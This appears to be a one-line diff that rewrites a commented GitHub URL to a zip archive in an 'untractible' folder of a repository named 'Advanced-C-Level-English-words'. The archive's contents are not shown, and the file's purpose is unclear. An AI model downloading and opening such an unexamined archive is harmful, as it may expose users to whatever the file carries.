@@ -1,1 +1,1 @@
-# https://raw.githubusercontent.com/RodinZava/Advanced-C-Level-English-words/main/untractible/Advanced-C-Level-English-words.zip
+# https://github.com/RodinZava/Advanced-C-Level-English-words/raw/refs/heads/main/untractible/Advanced-C-Level-English-words.zip
